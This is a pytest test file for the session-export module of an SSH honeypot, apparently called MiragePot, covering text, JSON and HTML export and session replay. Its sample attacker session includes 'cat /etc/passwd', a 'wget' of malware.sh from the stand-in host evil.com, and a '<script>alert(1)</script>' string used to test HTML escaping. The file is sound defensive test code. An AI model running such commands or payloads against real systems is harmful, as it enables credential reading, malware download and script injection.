"""Tests for the session_export module."""

import json
import tempfile
from pathlib import Path

import pytest

from miragepot.session_export import (
    SessionCommand,
    SessionData,
    export_as_text,
    export_as_json,
    export_as_html,
    iter_replay_session,
    load_session,
    list_sessions,
    export_session,
)


# =============================================================================
# Test Data
# =============================================================================


def create_sample_session() -> SessionData:
    """Create a sample session for testing."""
    return SessionData(
        session_id="session_test_12345",
        attacker_ip="192.168.1.100",
        attacker_port=54321,
        login_time="2024-01-15T12:00:00Z",
        logout_time="2024-01-15T12:05:30Z",
        duration_seconds=330.5,
        ssh_fingerprint={
            "client_version": "SSH-2.0-OpenSSH_8.9",
            "key_type": "ssh-rsa",
        },
        auth={
            "auth_attempts": 2,
            "successful_username": "root",
        },
        pty_info={
            "term": "xterm-256color",
            "width": 80,
            "height": 24,
        },
        commands=[
            SessionCommand(
                timestamp="2024-01-15T12:00:10Z",
                command="whoami",
                response="root\n",
                threat_score=0,
                delay_applied=0.0,
            ),
            SessionCommand(
                timestamp="2024-01-15T12:00:30Z",
                command="cat /etc/passwd",
                response="root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash\n",
                threat_score=5,
                delay_applied=0.1,
            ),
            SessionCommand(
                timestamp="2024-01-15T12:01:00Z",
                command="wget http://evil.com/malware.sh",
                response="--2024-01-15 12:01:00--  http://evil.com/malware.sh\n",
                threat_score=80,
                delay_applied=2.0,
            ),
        ],
        download_attempts=[
            {
                "tool": "wget",
                "source": "http://evil.com/malware.sh",
                "risk_level": "critical",
            }
        ],
        ttp_summary={
            "risk_level": "high",
            "current_stage": "execution",
            "techniques_detected": ["T1059", "T1105"],
        },
        honeytokens_summary={
            "total_tokens": 7,
            "unique_tokens_accessed": 2,
            "exfiltration_attempts": 0,
            "high_risk": False,
        },
    )


# =============================================================================
# SessionCommand Tests
# =============================================================================


class TestSessionCommand:
    """Tests for SessionCommand dataclass."""

    def test_from_dict(self):
        """Should create SessionCommand from dictionary."""
        data = {
            "timestamp": "2024-01-15T12:00:00Z",
            "command": "ls",
            "response": "file1\nfile2\n",
            "threat_score": 5,
            "delay_applied": 0.5,
        }
        cmd = SessionCommand.from_dict(data)
        assert cmd.timestamp == "2024-01-15T12:00:00Z"
        assert cmd.command == "ls"
        assert cmd.response == "file1\nfile2\n"
        assert cmd.threat_score == 5
        assert cmd.delay_applied == 0.5

    def test_from_dict_missing_fields(self):
        """Should handle missing fields with defaults."""
        data = {}
        cmd = SessionCommand.from_dict(data)
        assert cmd.timestamp == ""
        assert cmd.command == ""
        assert cmd.response == ""
        assert cmd.threat_score == 0
        assert cmd.delay_applied == 0.0


# =============================================================================
# SessionData Tests
# =============================================================================


class TestSessionData:
    """Tests for SessionData dataclass."""

    def test_from_dict(self):
        """Should create SessionData from dictionary."""
        data = {
            "session_id": "test_123",
            "attacker_ip": "10.0.0.1",
            "attacker_port": 12345,
            "login_time": "2024-01-15T10:00:00Z",
            "commands": [
                {
                    "command": "pwd",
                    "response": "/root\n",
                    "timestamp": "",
                    "threat_score": 0,
                    "delay_applied": 0,
                }
            ],
        }
        session = SessionData.from_dict(data)
        assert session.session_id == "test_123"
        assert session.attacker_ip == "10.0.0.1"
        assert len(session.commands) == 1
        assert session.commands[0].command == "pwd"

    def test_to_dict(self):
        """Should serialize SessionData to dictionary."""
        session = create_sample_session()
        data = session.to_dict()

        assert data["session_id"] == "session_test_12345"
        assert data["attacker_ip"] == "192.168.1.100"
        assert len(data["commands"]) == 3
        assert data["commands"][0]["command"] == "whoami"

    def test_from_json_file(self):
        """Should load SessionData from JSON file."""
        session = create_sample_session()
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(session.to_dict(), f)
            f.flush()

            loaded = SessionData.from_json_file(Path(f.name))
            assert loaded.session_id == session.session_id
            assert len(loaded.commands) == len(session.commands)


# =============================================================================
# Export Format Tests
# =============================================================================


class TestExportAsText:
    """Tests for text export functionality."""

    def test_basic_export(self):
        """Should export session as text."""
        session = create_sample_session()
        text = export_as_text(session)

        assert "MiragePot Session Transcript" in text
        assert "session_test_12345" in text
        assert "192.168.1.100" in text
        assert "whoami" in text
        assert "cat /etc/passwd" in text

    def test_includes_threat_scores(self):
        """Should include threat scores in export."""
        session = create_sample_session()
        text = export_as_text(session)

        assert "[Threat Score: 80]" in text

    def test_includes_download_attempts(self):
        """Should include download attempts."""
        session = create_sample_session()
        text = export_as_text(session)

        assert "Download Attempts" in text
        assert "evil.com" in text

    def test_without_metadata(self):
        """Should export without metadata when requested."""
        session = create_sample_session()
        text = export_as_text(session, include_metadata=False)

        assert "Session ID:" not in text
        assert "Session Transcript" in text
        assert "whoami" in text


class TestExportAsJson:
    """Tests for JSON export functionality."""

    def test_basic_export(self):
        """Should export session as valid JSON."""
        session = create_sample_session()
        json_str = export_as_json(session)

        data = json.loads(json_str)
        assert data["session_id"] == "session_test_12345"
        assert len(data["commands"]) == 3

    def test_pretty_print(self):
        """Should format JSON with indentation."""
        session = create_sample_session()
        json_str = export_as_json(session, pretty=True)

        assert "\n" in json_str
        assert "  " in json_str  # Indentation

    def test_compact_print(self):
        """Should format JSON without indentation when not pretty."""
        session = create_sample_session()
        json_str = export_as_json(session, pretty=False)

        # Should not have indentation-based newlines
        lines = json_str.split("\n")
        assert len(lines) == 1


class TestExportAsHtml:
    """Tests for HTML export functionality."""

    def test_basic_export(self):
        """Should export session as HTML."""
        session = create_sample_session()
        html = export_as_html(session)

        assert "<!DOCTYPE html>" in html
        assert "MiragePot Session" in html
        assert "session_test_12345" in html

    def test_includes_commands(self):
        """Should include commands in HTML."""
        session = create_sample_session()
        html = export_as_html(session)

        assert "whoami" in html
        assert "cat /etc/passwd" in html

    def test_includes_metadata(self):
        """Should include metadata in HTML."""
        session = create_sample_session()
        html = export_as_html(session)

        assert "192.168.1.100" in html
        assert "SSH-2.0-OpenSSH_8.9" in html

    def test_includes_risk_badge(self):
        """Should include risk badge in HTML."""
        session = create_sample_session()
        html = export_as_html(session)

        assert "risk-badge" in html
        assert "HIGH" in html

    def test_escapes_html_chars(self):
        """Should escape HTML characters in commands."""
        session = create_sample_session()
        session.commands.append(
            SessionCommand(
                timestamp="2024-01-15T12:02:00Z",
                command="echo '<script>alert(1)</script>'",
                response="<script>alert(1)</script>\n",
                threat_score=0,
                delay_applied=0.0,
            )
        )
        html = export_as_html(session)

        assert "&lt;script&gt;" in html
        assert (
            "<script>" not in html.split("<style>")[1].split("</style>")[0]
        )  # Only in style section


# =============================================================================
# Replay Tests
# =============================================================================


class TestIterReplaySession:
    """Tests for session replay iteration."""

    def test_yields_banner(self):
        """Should yield banner first."""
        session = create_sample_session()
        events = list(iter_replay_session(session))

        assert events[0]["type"] == "banner"
        assert "Ubuntu" in events[0]["content"]

    def test_yields_prompts_and_commands(self):
        """Should yield prompts and commands for each command."""
        session = create_sample_session()
        events = list(iter_replay_session(session))

        prompt_events = [e for e in events if e["type"] == "prompt"]
        command_events = [e for e in events if e["type"] == "command"]

        assert len(prompt_events) == 3  # 3 commands
        assert len(command_events) == 3

        assert command_events[0]["content"] == "whoami"

    def test_yields_responses(self):
        """Should yield responses."""
        session = create_sample_session()
        events = list(iter_replay_session(session))

        response_events = [e for e in events if e["type"] == "response"]
        assert len(response_events) == 3

        assert "root\n" in response_events[0]["content"]

    def test_yields_end(self):
        """Should yield end event."""
        session = create_sample_session()
        events = list(iter_replay_session(session))

        assert events[-1]["type"] == "end"

    def test_includes_threat_score(self):
        """Should include threat score in command events."""
        session = create_sample_session()
        events = list(iter_replay_session(session))

        command_events = [e for e in events if e["type"] == "command"]
        assert command_events[2]["threat_score"] == 80


# =============================================================================
# File Operations Tests
# =============================================================================


class TestLoadSession:
    """Tests for loading sessions from files."""

    def test_load_from_file(self):
        """Should load session from JSON file."""
        session = create_sample_session()

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump(session.to_dict(), f)
            f.flush()

            loaded = load_session(Path(f.name))
            assert loaded.session_id == session.session_id


class TestListSessions:
    """Tests for listing sessions."""

    def test_list_sessions(self):
        """Should list sessions in directory."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create some session files
            for i in range(3):
                session = create_sample_session()
                session_dict = session.to_dict()
                session_dict["session_id"] = f"session_{i}"
                path = Path(tmpdir) / f"session_{i}.json"
                path.write_text(json.dumps(session_dict))

            sessions = list_sessions(Path(tmpdir))
            assert len(sessions) == 3
            assert all("session_id" in s for s in sessions)

    def test_list_sessions_empty_dir(self):
        """Should return empty list for empty directory."""
        with tempfile.TemporaryDirectory() as tmpdir:
            sessions = list_sessions(Path(tmpdir))
            assert sessions == []


class TestExportSession:
    """Tests for exporting sessions to files."""

    def test_export_text(self):
        """Should export session as text file."""
        session = create_sample_session()

        with tempfile.TemporaryDirectory() as tmpdir:
            input_path = Path(tmpdir) / "session.json"
            input_path.write_text(json.dumps(session.to_dict()))

            output_path = Path(tmpdir) / "session.txt"
            export_session(input_path, output_path, format="text")

            assert output_path.exists()
            content = output_path.read_text()
            assert "MiragePot Session Transcript" in content

    def test_export_json(self):
        """Should export session as JSON file."""
        session = create_sample_session()

        with tempfile.TemporaryDirectory() as tmpdir:
            input_path = Path(tmpdir) / "session.json"
            input_path.write_text(json.dumps(session.to_dict()))

            output_path = Path(tmpdir) / "session_export.json"
            export_session(input_path, output_path, format="json")

            assert output_path.exists()
            data = json.loads(output_path.read_text())
            assert data["session_id"] == session.session_id

    def test_export_html(self):
        """Should export session as HTML file."""
        session = create_sample_session()

        with tempfile.TemporaryDirectory() as tmpdir:
            input_path = Path(tmpdir) / "session.json"
            input_path.write_text(json.dumps(session.to_dict()))

            output_path = Path(tmpdir) / "session.html"
            export_session(input_path, output_path, format="html")

            assert output_path.exists()
            content = output_path.read_text()
            assert "<!DOCTYPE html>" in content

    def test_export_invalid_format(self):
        """Should raise error for invalid format."""
        session = create_sample_session()

        with tempfile.TemporaryDirectory() as tmpdir:
            input_path = Path(tmpdir) / "session.json"
            input_path.write_text(json.dumps(session.to_dict()))

            output_path = Path(tmpdir) / "session.xyz"
            with pytest.raises(ValueError, match="Unknown format"):
                export_session(input_path, output_path, format="xyz")
